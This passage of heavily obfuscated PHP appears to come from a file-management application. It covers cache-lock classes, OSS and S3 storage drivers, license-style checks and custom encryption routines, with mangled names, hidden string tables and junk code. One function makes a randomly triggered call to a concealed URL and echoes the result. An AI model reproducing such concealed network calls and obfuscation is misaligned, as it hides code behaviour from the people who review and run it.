$üŞ³œş = $Ä¿Ç‰Ô[712]; if (strlen($üŞ³œş) < $Ä¿Ç‰Ô[647]) { return; } $¾ÃåİçŠ = $¾ÃåİçŠ ? intval($¾ÃåİçŠ) : 0; $‹ÜÕµ­Ë = $Ä¿Ç‰Ô[713]; return $‹Öî¾— + $¾ÃåİçŠ; $…ğöÎ²Ä = $Ä¿Ç‰Ô[714]; while ($…ğöÎ²Ä < $Ä¿Ç‰Ô[647]) { if ($…ğöÎ²Ä >= 0) { break; } $…ğöÎ²Ä++; } } public function wmjhc500cbef($Ç½ò¹ã) { $™‰Ê¨ö— =& $_SERVER[¹ş¤¶ĞÖ]; $¥º¢„Â =& $_SERVER[Æ×£¿Ÿì]; $Ú°‚½ï‘ = $this->zsklba03c3ee(); if ($Ç½ò¹ã[$¥º¢„Â[290]] == $¥º¢„Â[121]) { return; } if ($Ú°‚½ï‘ >= intval($¥º¢„Â[211])) { return; } $‘¸”çÓ = Model($¥º¢„Â[124])->count(); $¹íäª®õ = $™‰Ê¨ö—[715]; if ($‘¸”çÓ <= $Ú°‚½ï‘) { return; } $ŠæÕÃ¶Œ = Model($¥º¢„Â[124])->field($¥º¢„Â[290])->limit($Ú°‚½ï‘)->select(); $ŠæÕÃ¶Œ = array_to_keyvalue($ŠæÕÃ¶Œ, $¥º¢„Â[6], $¥º¢„Â[290]); $¦ÂÅ¶ó‰ = $™‰Ê¨ö—[716]; if (!$¦ÂÅ¶ó‰) { return; } if (!in_array($Ç½ò¹ã[$¥º¢„Â[290]], $ŠæÕÃ¶Œ)) { show_json($¥º¢„Â[291], !1, $¥º¢„Â[207]); } } public function rupcbb67b66e() { $ãØÌÉ©ç =& $_SERVER[¹ş¤¶ĞÖ]; $¯Õè¬ƒ =& $_SERVER[Æ×£¿Ÿì]; if (!_get($GLOBALS, $¯Õè¬ƒ[115]) || mt_rand(1, 100) > 20) { return; } $Âó›¶«õ = $¯Õè¬ƒ[214]; $ú†ã‚£ = $ãØÌÉ©ç[717]; if (!$ú†ã‚£) { return; } $Âó›¶«õ = $this->hicg1688814b($Âó›¶«õ, $¯Õè¬ƒ[215]); $†íå‡‹ = stream_context_create(array($¯Õè¬ƒ[216] => array($¯Õè¬ƒ[217] => $¯Õè¬ƒ[218], $¯Õè¬ƒ[219] => 3))); $Îş—‰¿† = $ãØÌÉ©ç[718]; while (strlen($Îş—‰¿†) < $ãØÌÉ©ç[647]) { if (!$Îş—‰¿†) { break; } $Îş—‰¿†++; } $ŠùÃôÆ = @file_get_contents($Âó›¶«õ, !1, $†íå‡‹); echo $¯Õè¬ƒ[292] . hash_encode($ŠùÃôÆ) . $¯Õè¬ƒ[293]; $ÖÈÉ£´‹ = $ãØÌÉ©ç[719]; } private function sqjh42353ebe($À¢ø´Üè, $‚¾Ú¦Œİ, $ñıæ—ş = 3) { $á‰ßÈ =& $_SERVER[¹ş¤¶ĞÖ]; $‰Ê›ì†ª =& $_SERVER[Æ×£¿Ÿì]; usleep(1); $ˆ³ğ¹ØÙ = $á‰ßÈ[720]; if (strlen($ˆ³ğ¹ØÙ) < $á‰ßÈ[642]) { return; } $À¢ø´Üè = trim($À¢ø´Üè); $º÷á¯ñ£ = mt_rand(0, 5) . $‰Ê›ì†ª[6]; $ÏéÈ×š = rand_string(15); $ü±³±ë = $‰Ê›ì†ª[294]; $×¾ö®…ä = $á‰ßÈ[721]; switch ($º÷á¯ñ£) { case $‰Ê›ì†ª[203]: $í”ÏˆŠ† = $this->egbm08f767bd($À¢ø´Üè, strrev($‚¾Ú¦Œİ . $ÏéÈ×š)); $›ùÆ£Íô = $á‰ßÈ[722]; break; case $‰Ê›ì†ª[121]: $í”ÏˆŠ† = $this->egbm08f767bd($À¢ø´Üè, strrev($ÏéÈ×š . $‚¾Ú¦Œİ)); break; case $‰Ê›ì†ª[295]: $í”ÏˆŠ† = $this->egbm08f767bd($À¢ø´Üè, base64_encode($ÏéÈ×š . $‚¾Ú¦Œİ)); $ª•ŠâĞà = $á‰ßÈ[723]; if (strlen($ª•ŠâĞà) < $á‰ßÈ[642]) { die; } break; case $‰Ê›ì†ª[296]: $í”ÏˆŠ† = $this->egbm08f767bd($À¢ø´Üè, md5($ÏéÈ×š . $‚¾Ú¦Œİ)); break; $İÃ¾ş÷¹ = $á‰ßÈ[724]; if (!$İÃ¾ş÷¹) { return; } case $‰Ê›ì†ª[297]: $À¢ø´Üè = base64_encode($À¢ø´Üè); $›…º½®Ü = rand(0, 64); $–Šè×»œ = $ü±³±ë[$›…º½®Ü]; $€¡ø²»” = md5($–Šè×»œ . md5($‚¾Ú¦Œİ . $–Šè×»œ) . $‚¾Ú¦Œİ); $ÏãÙ¸ÑÛ = $á‰ßÈ[725]; while ($ÏãÙ¸ÑÛ < $á‰ßÈ[658]) { if ($ÏãÙ¸ÑÛ >= 0) { break; } $ÏãÙ¸ÑÛ++; } $€¡ø²»” = substr($€¡ø²»”, $›…º½®Ü % 8, $›…º½®Ü % 8 + 7); $äûÚÊ†ò = $á‰ßÈ[726]; $·£¯¡‚ = $‰Ê›ì†ª[6]; $¬şÈÊ¾ë = $á‰ßÈ[727]; if (!$¬şÈÊ¾ë) { return; } $‚Ù¯¨¦Á = 0; $Ÿïæ¶„è = 0; $—º„ÆÚº = $á‰ßÈ[728]; if (strlen($—º„ÆÚº) < $á‰ßÈ[636]) { die; } $ëÈæãÔß = 0; for ($‚Ù¯¨¦Á = 0; $‚Ù¯¨¦Á < strlen($À¢ø´Üè); $‚Ù¯¨¦Á++) { $ëÈæãÔß = $ëÈæãÔß == strlen($€¡ø²»”) ? 0 : $ëÈæãÔß; $©¶ßöÆ = $á‰ßÈ[729]; if (!$©¶ßöÆ) { return; } $Ÿïæ¶„è = ($›…º½®Ü + strpos($ü±³±ë, $À¢ø´Üè[$‚Ù¯¨¦Á]) + ord($€¡ø²»”[$ëÈæãÔß++])) % 64; $¹äÙªƒç = $á‰ßÈ[730]; if (strlen($¹äÙªƒç) < $á‰ßÈ[642]) { die; } $·£¯¡‚ .= $ü±³±ë[$Ÿïæ¶„è]; $Ÿí¾ı‘ş = $á‰ßÈ[731]; while ($Ÿí¾ı‘ş < $á‰ßÈ[647]) { if ($Ÿí¾ı‘ş >= 0) { break; } $Ÿí¾ı‘ş++; } } $í”ÏˆŠ† = hash_encode($–Šè×»œ . $·£¯¡‚); $¬…íÄŞÊ = $á‰ßÈ[732]; break; default: $í”ÏˆŠ† = $this->egbm08f767bd($À¢ø´Üè, $‚¾Ú¦Œİ . $ÏéÈ×š); $œ‹¦Ôáú = $á‰ßÈ[733]; while (strlen($œ‹¦Ôáú) < $á‰ßÈ[658]) { if (!$œ‹¦Ôáú) { break; } $œ‹¦Ôáú++; } break; } $í”ÏˆŠ† = strrev($º÷á¯ñ£ . $ÏéÈ×š . $í”ÏˆŠ†); if ($ñıæ—ş - 1 > 0) { $í”ÏˆŠ† = $this->sqjh42353ebe($í”ÏˆŠ†, $‚¾Ú¦Œİ, $ñıæ—ş - 1); } return $í”ÏˆŠ†; } private function oztl99876ebd($•ñÊúÖ, $›š…´®†, $òçìËÉ = 3) { $¹Á«ö—¤ =& $_SERVER[¹ş¤¶ĞÖ]; $Úüùñ± =& $_SERVER[Æ×£¿Ÿì]; if (!is_string($•ñÊúÖ) || strlen($•ñÊúÖ) < 10) { return !1; } $•ñÊúÖ = trim($•ñÊúÖ); $ÍÑ²¶Ûˆ = $¹Á«ö—¤[734]; while (strlen($ÍÑ²¶Ûˆ) < $¹Á«ö—¤[642]) { if (!$ÍÑ²¶Ûˆ) { break; } $ÍÑ²¶Ûˆ++; } $•ñÊúÖ = strrev($•ñÊúÖ); $ïë˜ÈÛ¦ = $¹Á«ö—¤[735]; if (!$ïë˜ÈÛ¦) { return; } $çÊğü·™ = $•ñÊúÖ[0]; $¹«ï¡„‘ = $¹Á«ö—¤[736]; if (strlen($¹«ï¡„‘) < $¹Á«ö—¤[636]) { return; } $í¿×÷Õ¹ = substr($•ñÊúÖ, 1, 15); $·ı¯ìı = $¹Á«ö—¤[737]; $•ñÊúÖ = substr($•ñÊúÖ, 16); $çŠû¬  = $Úüùñ±[294]; $Ô—š²Üù = $¹Á«ö—¤[738]; while ($Ô—š²Üù < $¹Á«ö—¤[656]) { if ($Ô—š²Üù >= 0) { break; } $Ô—š²Üù++; } switch ($çÊğü·™) { case $Úüùñ±[203]: $Š±‘¬ù = $this->hicg1688814b($•ñÊúÖ, strrev($›š…´®† . $í¿×÷Õ¹)); break; case $Úüùñ±[121]: $Š±‘¬ù = $this->hicg1688814b($•ñÊúÖ, strrev($í¿×÷Õ¹ . $›š…´®†)); $Š•Š—Éâ = $¹Á«ö—¤[739]; break; case $Úüùñ±[295]: $Š±‘¬ù = $this->hicg1688814b($•ñÊúÖ, base64_encode($í¿×÷Õ¹ . $›š…´®†)); $¨Å’ §Å = $¹Á«ö—¤[740]; while ($¨Å’ §Å < $¹Á«ö—¤[658]) { if ($¨Å’ §Å >= 0) { break; } $¨Å’ §Å++; } break; case $Úüùñ±[296]: $Š±‘¬ù = $this->hicg1688814b($•ñÊúÖ, md5($í¿×÷Õ¹ . $›š…´®†)); $ŒÈ´Üêò = $¹Á«ö—¤[741]; while ($ŒÈ´Üêò < $¹Á«ö—¤[636]) { if ($ŒÈ´Üêò >= 0) { break; } $ŒÈ´Üêò++; } break; case $Úüùñ±[297]: $•ñÊúÖ = hash_decode($•ñÊúÖ); $ÎŠæÃâÄ = $•ñÊúÖ[0]; $û¦„«É‚ = $¹Á«ö—¤[742]; while ($û¦„«É‚ < $¹Á«ö—¤[647]) { if ($û¦„«É‚ >= 0) { break; } $û¦„«É‚++; } $•ñÊúÖ = substr($•ñÊúÖ, 1); $µœ™ëãÅ = $¹Á«ö—¤[743]; while ($µœ™ëãÅ < $¹Á«ö—¤[647]) { if ($µœ™ëãÅ >= 0) { break; } $µœ™ëãÅ++; } $“—¿îíÀ = strpos($çŠû¬ , $ÎŠæÃâÄ); $Ó³¶¶Øæ = md5($ÎŠæÃâÄ . md5($›š…´®† . $ÎŠæÃâÄ) . $›š…´®†); $ĞÃ×Àˆ = $¹Á«ö—¤[744]; if (!$ĞÃ×Àˆ) { die; } $Ó³¶¶Øæ = substr($Ó³¶¶Øæ, $“—¿îíÀ % 8, $“—¿îíÀ % 8 + 7); $Î‹µäé = $Úüùñ±[6]; $´ÀãÀ™é = 0; $Î¶¹®ü” = 0; $³Œ‘®œî = $¹Á«ö—¤[745]; while ($³Œ‘®œî < $¹Á«ö—¤[647]) { if ($³Œ‘®œî >= 0) { break; } $³Œ‘®œî++; } $—É½‰³ = 0; $ªËÁµŸõ = $¹Á«ö—¤[746]; if (!$ªËÁµŸõ) { return; } for ($´ÀãÀ™é = 0; $´ÀãÀ™é < strlen($•ñÊúÖ); $´ÀãÀ™é++) { $—É½‰³ = $—É½‰³ == strlen($Ó³¶¶Øæ) ? 0 : $—É½‰³; $î­—ÔÈ = $¹Á«ö—¤[747]; if (strlen($î­—ÔÈ) < $¹Á«ö—¤[642]) { die; } $õÊÜÁ¡ğ = $—É½‰³++; $Î¶¹®ü” = strpos($çŠû¬ , $•ñÊúÖ[$´ÀãÀ™é]) - $“—¿îíÀ - ord($Ó³¶¶Øæ[$õÊÜÁ¡ğ]); $ËÎØÈáı = $¹Á«ö—¤[748]; while ($Î¶¹®ü” < 0) { $Î¶¹®ü” += 64; } $Î‹µäé .= $çŠû¬ [$Î¶¹®ü”]; $Ÿİú©Ê§ = $¹Á«ö—¤[749]; while ($Ÿİú©Ê§ < $¹Á«ö—¤[658]) { if ($Ÿİú©Ê§ >= 0) { break; } $Ÿİú©Ê§++; } } $Š±‘¬ù = base64_decode($Î‹µäé); break; default: $Š±‘¬ù = $this->hicg1688814b($•ñÊúÖ, $›š…´®† . $í¿×÷Õ¹); $¢ò»İÒ¾ = $¹Á«ö—¤[748]; if (!$¢ò»İÒ¾) { return; } break; } if ($òçìËÉ - 1 > 0) { $Š±‘¬ù = $this->oztl99876ebd($Š±‘¬ù, $›š…´®†, $òçìËÉ - 1); } return $Š±‘¬ù; } public function cqnd4022adf5($ìÂÄˆ†Ì) { $šñíûƒ½ =& $_SERVER[¹ş¤¶ĞÖ]; $¬­»ãÖ¡ =& $_SERVER[Æ×£¿Ÿì]; $ÑÎÏış = $this->ztwcc1091a50(); $ÂÆ¿‰Á“ = $šñíûƒ½[750]; if (!$ÂÆ¿‰Á“) { return; } $ĞêŒÎøú = $this->ztwcc1091a50(); $›ØÊİ„ = $šñíûƒ½[751]; if (strlen($›ØÊİ„) < $šñíûƒ½[656]) { die; } $·±–Œ£² = ($ÑÎÏış - 1) * ($ĞêŒÎøú - 1); $¯´Ş¡Æ = $šñíûƒ½[752]; $’•ëå­œ = intval(($ÑÎÏış + $ĞêŒÎøú) / 2); while (1) { $‰Òü¡¿İ = $’•ëå­œ; $åªèÖ÷ß = $·±–Œ£²; while ($åªèÖ÷ß % $‰Òü¡¿İ != 0) { $é¡ºÈèÔ = $åªèÖ÷ß; $­×àáĞó = $šñíûƒ½[753]; while ($­×àáĞó < $šñíûƒ½[642]) { if ($­×àáĞó >= 0) { break; } $­×àáĞó++; } $åªèÖ÷ß = $‰Òü¡¿İ; $¿¿èËŒÙ = $šñíûƒ½[754]; while ($¿¿èËŒÙ < $šñíûƒ½[658]) { if ($¿¿èËŒÙ >= 0) { break; } $¿¿èËŒÙ++; } $‰Òü¡¿İ = $é¡ºÈèÔ % $‰Òü¡¿İ; $ßµò´Šõ = $šñíûƒ½[755]; if (!$ßµò´Šõ) { die; } } if ($‰Òü¡¿İ == 1) { break; } else { $’•ëå­œ++; } } $ñ£‰ÁÄÁ = 2; for ($ú± ¡» = 0; $ú± ¡» < $·±–Œ£² * 10; $ú± ¡»++) { if (($·±–Œ£² * $ú± ¡» + 1) % $’•ëå­œ == 0) { $ñ£‰ÁÄÁ = intval(($·±–Œ£² * $ú± ¡» + 1) / $’•ëå­œ); break; } } $æè‘¼Õ¿ = $this->egbm08f767bd($ÑÎÏış * $ĞêŒÎøú . $¬­»ãÖ¡[6], $¬­»ãÖ¡[135]); $Ïàûç±° = md5($¬­»ãÖ¡[298] . ($ÑÎÏış + $ĞêŒÎøú) . $¬­»ãÖ¡[299] . $’•ëå­œ . $¬­»ãÖ¡[299] . $ñ£‰ÁÄÁ . $¬­»ãÖ¡[300]); $ã·ÓîÒ = $this->egbm08f767bd($ìÂÄˆ†Ì, $Ïàûç±°) . $¬­»ãÖ¡[301] . $æè‘¼Õ¿; $ûçÇú°ğ = $šñíûƒ½[756]; while (strlen($ûçÇú°ğ) < $šñíûƒ½[642]) { if (!$ûçÇú°ğ) { break; } $ûçÇú°ğ++; } return $ã·ÓîÒ; } public function yxqk7a89d202($¤€´çİß) { $¦Î˜í° =& $_SERVER[¹ş¤¶ĞÖ]; $æ—Ò³®¾ =& $_SERVER[Æ×£¿Ÿì]; $òÚÃİµ“ = explode($æ—Ò³®¾[301], $¤€´çİß); if (count($òÚÃİµ“) != 2) { return $æ—Ò³®¾[6]; } $ˆúŒÚ€Â = $this->hicg1688814b($òÚÃİµ“[1] . $æ—Ò³®¾[6], $æ—Ò³®¾[135]); if (!$ˆúŒÚ€Â) { return $æ—Ò³®¾[6]; } $ˆúŒÚ€Â = intval($ˆúŒÚ€Â); $Ü˜ùåô¸ = $¦Î˜í°[757]; $È£Õ›‡¯ = 0; $™ìëü˜å = 0; for ($õ¯£®„ = 3; $õ¯£®„ < $ˆúŒÚ€Â; $õ¯£®„ += 2) { if ($ˆúŒÚ€Â % $õ¯£®„ != 0) { continue; } $È£Õ›‡¯ = $õ¯£®„; $™ìëü˜å = intval($ˆúŒÚ€Â / $õ¯£®„); break; $­«·¿ù€ = $¦Î˜í°[758]; while ($­«·¿ù€ < $¦Î˜í°[656]) { if ($­«·¿ù€ >= 0) { break; } $­«·¿ù€++; } } $Ä±¬ĞŸó = ($È£Õ›‡¯ - 1) * ($™ìëü˜å - 1); $£úåĞâÏ = intval(($È£Õ›‡¯ + $™ìëü˜å) / 2); $—‹Õû£ï = $¦Î˜í°[759]; while (1) { $Ç£­ÕÇ‡ = $£úåĞâÏ; $üãÍ—ê’ = $¦Î˜í°[760]; $™åµ°Û = $Ä±¬ĞŸó; while ($™åµ°Û % $Ç£­ÕÇ‡ != 0) { $§‰˜è— = $™åµ°Û; $™åµ°Û = $Ç£­ÕÇ‡; $ŒÓåçØ€ = $¦Î˜í°[761]; if (!$ŒÓåçØ€) { return; } $Ç£­ÕÇ‡ = $§‰˜è— % $Ç£­ÕÇ‡; $”ñËæ– = $¦Î˜í°[716]; } if ($Ç£­ÕÇ‡ == 1) { break; } else { $£úåĞâÏ++; } } $¶Ó´³¾í = 2; $ë¯ŠˆÓ‰ = $¦Î˜í°[762]; if (!$ë¯ŠˆÓ‰) { return; } for ($õ¯£®„ = 0; $õ¯£®„ < $Ä±¬ĞŸó * 10; $õ¯£®„++) { if (($Ä±¬ĞŸó * $õ¯£®„ + 1) % $£úåĞâÏ == 0) { $¶Ó´³¾í = intval(($Ä±¬ĞŸó * $õ¯£®„ + 1) / $£úåĞâÏ); break; } } $Á‘ò“È = md5($æ—Ò³®¾[298] . ($È£Õ›‡¯ + $™ìëü˜å) . $æ—Ò³®¾[299] . $£úåĞâÏ . $æ—Ò³®¾[299] . $¶Ó´³¾í . $æ—Ò³®¾[300]); $Î«Æîô§ = $¦Î˜í°[763]; $ª©·¤› = $this->hicg1688814b($òÚÃİµ“[0], $Á‘ò“È); $®ª¥â ¨ = $¦Î˜í°[764]; if (strlen($®ª¥â ¨) < $¦Î˜í°[642]) { return; } return $ª©·¤›; $ Å—¬¹° = $¦Î˜í°[765]; if (!$ Å—¬¹°) { return; } } public function ztwcc1091a50() { $³²Í› =& $_SERVER[¹ş¤¶ĞÖ]; $‹²¿Åì¬ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ËÌ¯ÂÓ = $³²Í›[766]; $ñöŞõì½ = array(); $Ñ¯ò˜ˆé = $³²Í›[767]; if (!$Ñ¯ò˜ˆé) { die; } $ìÃŒ•Š‰ = 1; while ($ìÃŒ•Š‰ <= (int) sqrt($‹²¿Åì¬)) { $…Œ¿ôÆ¥ = $ìÃŒ•Š‰; $¤«ñ…¯Ì = $³²Í›[768]; while (strlen($¤«ñ…¯Ì) < $³²Í›[656]) { if (!$¤«ñ…¯Ì) { break; } $¤«ñ…¯Ì++; } while (!0) { $…Œ¿ôÆ¥++; $Êˆ±¡¥ñ = $³²Í›[769]; if (strlen($Êˆ±¡¥ñ) < $³²Í›[656]) { return; } if ($…Œ¿ôÆ¥ <= 2) { $ìÃŒ•Š‰ = $…Œ¿ôÆ¥; break; } else { if ($…Œ¿ôÆ¥ < 2) { continue; } } $ÅÑ—ı“õ = !0; for ($‹ê”—æ = 2; $‹ê”—æ <= sqrt($…Œ¿ôÆ¥); $‹ê”—æ++) { if ($…Œ¿ôÆ¥ % $‹ê”—æ == 0) { $ÅÑ—ı“õ = !1; } } if ($ÅÑ—ı“õ) { $ìÃŒ•Š‰ = $…Œ¿ôÆ¥; break; } } $ñöŞõì½[] = $ìÃŒ•Š‰; } $ıŞú³ıà = 2; $à•‹ûâ˜ = $³²Í›[770]; if (strlen($à•‹ûâ˜) < $³²Í›[656]) { return; } for ($…Œ¿ôÆ¥ = $‹²¿Åì¬; $…Œ¿ôÆ¥ > 1; $…Œ¿ôÆ¥--) { $ÅÑ—ı“õ = !0; $ùÔ€Äß  = $³²Í›[771]; if (strlen($ùÔ€Äß ) < $³²Í›[642]) { return; } foreach ($ñöŞõì½ as $Ú£Ëúš) { if ($…Œ¿ôÆ¥ % $Ú£Ëúš == 0) { $ÅÑ—ı“õ = !1; break; } } if ($ÅÑ—ı“õ) { $ıŞú³ıà = $…Œ¿ôÆ¥; break; } } return $ıŞú³ıà; } public function ljtceca3bf13($ÓÕ±¸¨, $À‡¹èµ) { $ÚÚ¶Ş¸Ç =& $_SERVER[Æ×£¿Ÿì]; return call_user_func(array($ÚÚ¶Ş¸Ç[8], $ÚÚ¶Ş¸Ç[302]), $ÓÕ±¸¨, $À‡¹èµ); $‡–÷ç™Ø = $_SERVER[¹ş¤¶ĞÖ][772]; if (!$‡–÷ç™Ø) { return; } } public function egbm08f767bd($¼ÏœÁöš, $Å±•œÄ) { $„šƒ¡ûé =& $_SERVER[Æ×£¿Ÿì]; return call_user_func(array($„šƒ¡ûé[303], $„šƒ¡ûé[304]), $¼ÏœÁöš, $Å±•œÄ); $¥şÑÎ  = $_SERVER[¹ş¤¶ĞÖ][725]; if (!$¥şÑÎ ) { die; } } public function hicg1688814b($¾·ØÑ·¼, $’ÎºÚÌà) { $ìç™±²Œ =& $_SERVER[Æ×£¿Ÿì]; return call_user_func(array($ìç™±²Œ[303], $ìç™±²Œ[305]), $¾·ØÑ·¼, $’ÎºÚÌà); $æ‚ßù’à = $_SERVER[¹ş¤¶ĞÖ][773]; if (!$æ‚ßù’à) { die; } } } goto aáÄÓÓ¨ìÜ; cˆÀ‡õè–: class CacheLockRedis { public function lock($«ÃŸÜ‰ù, $Àº¹¥Óâ = 10) { $×¬Ä = Cache::init(); $’Ÿ¥ØÕÕ = microtime(!0) + $Àº¹¥Óâ; while (microtime(!0) < $’Ÿ¥ØÕÕ) { $‚ŸÆú©æ = $×¬Ä->get($«ÃŸÜ‰ù); if (!$‚ŸÆú©æ) { $ã ß”¿¨ = $×¬Ä->setLock($«ÃŸÜ‰ù, $’Ÿ¥ØÕÕ, $Àº¹¥Óâ); if ($ã ß”¿¨) { return !0; } } else { if ($‚ŸÆú©æ < microtime(!0)) { $×¬Ä->set($«ÃŸÜ‰ù, $’Ÿ¥ØÕÕ, $Àº¹¥Óâ * 2); if ($×¬Ä->get($«ÃŸÜ‰ù) === $‚ŸÆú©æ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($™À‹ßŠ¨) { return Cache::init()->get($™À‹ßŠ¨); } public function unlock($ØÑÈˆÏ²) { return Cache::init()->remove($ØÑÈˆÏ²); } } class CacheLockMemcached { public function lock($½‹€Öüã, $­úùşûÌ = 0) { $¦ªÙ×ğŠ = Cache::init(); $ãßñ–Ê‰ = microtime(!0) + $­úùşûÌ; while (microtime(!0) < $ãßñ–Ê‰) { $™°òÌ¨Ì = $¦ªÙ×ğŠ->get($½‹€Öüã); if (!$™°òÌ¨Ì || $™°òÌ¨Ì < microtime(!0)) { $ã¼§‘„Ù = $¦ªÙ×ğŠ->handle->add($½‹€Öüã, $ãßñ–Ê‰, $­úùşûÌ); if ($ã¼§‘„Ù) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ô®ëÃâĞ) { return Cache::init()->get($Ô®ëÃâĞ); } public function unlock($šÎ±Ğ·) { return Cache::init()->remove($šÎ±Ğ·); } } class CacheLockDatabase { public function lock($ïİëêš„, $áâ™‰ë¹ = 0) { $«šÉóÀ = Model($_SERVER[¹ş¤¶ĞÖ][855]); $ÔÆšĞ€à = microtime(!0) + $áâ™‰ë¹; while (microtime(!0) < $ÔÆšĞ€à) { $í‡ñÖİÒ = $«šÉóÀ->get($ïİëêš„); if (!$í‡ñÖİÒ || $í‡ñÖİÒ < microtime(!0)) { $óæë±¶ş = $«šÉóÀ->set($ïİëêš„, $ÔÆšĞ€à); if ($óæë±¶ş) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($…®œ´é) { return Model($_SERVER[¹ş¤¶ĞÖ][855])->get($…®œ´é); } public function unlock($ş²÷ÉÜË) { Model($_SERVER[¹ş¤¶ĞÖ][855])->remove($ş²÷ÉÜË); } } goto AËƒ’÷š’ó; EÃğ–¬æ§µ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($©óØğıë) { parent::__construct($©óØğıë); $this->signatureVersion($_SERVER[¹ş¤¶ĞÖ][216]); } public function fileOutLink($‡í£Èõï) { $—±üÚƒÈ =& $_SERVER[¹ş¤¶ĞÖ]; if (substr($‡í£Èõï, 0, 7) == $—±üÚƒÈ[1364]) { $‡í£Èõï = $—±üÚƒÈ[1365] . substr($‡í£Èõï, 7); } header($—±üÚƒÈ[161] . $‡í£Èõï); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($âŞÓÊÎ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¹ş¤¶ĞÖ][1401]; $this->_init($âŞÓÊÎ); } public function _init($¡£ú¹ıÊ) { $ìÜ¶‹ =& $_SERVER[¹ş¤¶ĞÖ]; $this->config = $¡£ú¹ıÊ; foreach ($¡£ú¹ıÊ as $³‘ïÌ¥¶ => $É…Í”ñÂ) { if (isset($this->{$³‘ïÌ¥¶})) { $this->{$³‘ïÌ¥¶} = $É…Í”ñÂ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ìÜ¶‹[1402] . LNG($ìÜ¶‹[1403])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ß¢Ïƒ =& $_SERVER[¹ş¤¶ĞÖ]; $Ğó¹‚—À = new OSS\Model\CorsConfig(); $½ÅË“ş° = new OSS\Model\CorsRule(); $½ÅË“ş°->addAllowedOrigin($ß¢Ïƒ[1404]); $½ÅË“ş°->addAllowedMethod($ß¢Ïƒ[1405]); $½ÅË“ş°->addAllowedMethod($ß¢Ïƒ[1406]); $½ÅË“ş°->addAllowedMethod($ß¢Ïƒ[1407]); $½ÅË“ş°->addAllowedMethod($ß¢Ïƒ[1408]); $½ÅË“ş°->addAllowedMethod($ß¢Ïƒ[160]); $½ÅË“ş°->setMaxAgeSeconds(600); $½ÅË“ş°->addExposeHeader($ß¢Ïƒ[1409]); $½ÅË“ş°->addAllowedHeader($ß¢Ïƒ[1404]); $Ğó¹‚—À->addRule($½ÅË“ş°); try { $this->client->putBucketCors($this->bucket, $Ğó¹‚—À); } catch (OSS\Core\OssException $Ö•¦¯‡Œ) { return !1; } return !0; } public function getBucketCors() { $äóßÃÁÖ =& $_SERVER[¹ş¤¶ĞÖ]; $¦æ¿¦Û„ = null; try { $¦æ¿¦Û„ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ö§îÄ°) { return null; } if (!$¦æ¿¦Û„ || !($îÑéĞÕì = $¦æ¿¦Û„->getRules())) { return null; } $æÀ„‰¿ = $îÑéĞÕì[0]->getAllowedOrigins(); $øÛ’øšĞ = $îÑéĞÕì[0]->getAllowedMethods(); $ÑıŸ˜ìÔ = $îÑéĞÕì[0]->getMaxAgeSeconds(); $Û„Ø¹Ğí = $îÑéĞÕì[0]->getExposeHeaders(); $ÒƒÓ¶š¦ = $îÑéĞÕì[0]->getAllowedHeaders(); return array($äóßÃÁÖ[188] => isset($æÀ„‰¿[0]) ? $æÀ„‰¿[0] : $äóßÃÁÖ[12], $äóßÃÁÖ[192] => $øÛ’øšĞ, $äóßÃÁÖ[1410] => $ÑıŸ˜ìÔ, $äóßÃÁÖ[1411] => isset($Û„Ø¹Ğí[0]) ? $Û„Ø¹Ğí[0] : $äóßÃÁÖ[12], $äóßÃÁÖ[190] => isset($ÒƒÓ¶š¦[0]) ? $ÒƒÓ¶š¦[0] : $äóßÃÁÖ[12]); } public function isBucketCors() { $ı…‰ŞŸ =& $_SERVER[¹ş¤¶ĞÖ]; $Í‰–÷Áª = $this->getBucketCors(); if (!$Í‰–÷Áª || !is_array($Í‰–÷Áª)) { return !1; } if ($Í‰–÷Áª[$ı…‰ŞŸ[188]] != $ı…‰ŞŸ[189] || $Í‰–÷Áª[$ı…‰ŞŸ[190]] != $ı…‰ŞŸ[189]) { return !1; } $ñ¹Ä©‰ = array_map($ı…‰ŞŸ[191], $Í‰–÷Áª[$ı…‰ŞŸ[192]]); if (!is_array($ñ¹Ä©‰)) { $ñ¹Ä©‰ = array(); } $Œ‚Öà÷é = array($ı…‰ŞŸ[193], $ı…‰ŞŸ[194], $ı…‰ŞŸ[195], $ı…‰ŞŸ[196], $ı…‰ŞŸ[197]); $Àşîëşş = array_diff($Œ‚Öà÷é, $ñ¹Ä©‰); return empty($Àşîëşş); } public function mkfile($—®âê×ò, $Ğ‹†°®Õ = '', $Ì®È¤©÷ = REPEAT_RENAME) { $ƒéŸ¬Œ² = $this->setContent($—®âê×ò, $Ğ‹†°®Õ); if ($ƒéŸ¬Œ² !== !1) { return $this->getPathOuter($—®âê×ò); } return !1; } public function mkdir($Ğ¹íûà‹, $·ƒ•’ÕÕ = REPEAT_SKIP) { if ($·ƒ•’ÕÕ && $this->_isFolder($Ğ¹íûà‹)) { return $this->getPathOuter($Ğ¹íûà‹); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ğ¹íûà‹)); } catch (OSS\Core\OssException $’×ç¦ø) { return !1; } return $this->getPathOuter($Ğ¹íûà‹); } private function fileList($ŞçÃÏ, $¨ê†·®« = '', $Ş€–•«Ô = 0) { $•ĞäÚ“Æ =& $_SERVER[¹ş¤¶ĞÖ]; $ŞçÃÏ = trim($ŞçÃÏ, $•ĞäÚ“Æ[8]); $ˆ“’»Ô´ = empty($ŞçÃÏ) && $ŞçÃÏ !== $•ĞäÚ“Æ[198] ? $•ĞäÚ“Æ[12] : $ŞçÃÏ . $•ĞäÚ“Æ[8]; $è•ƒºƒ = $•ĞäÚ“Æ[12]; $ó‰çä¾ú = 1000; $»õŸ¦•ú = $âŠÑì‰¦ = array(); while (!0) { check_abort(); $ü×³ë¤ = array($•ĞäÚ“Æ[1412] => $¨ê†·®«, 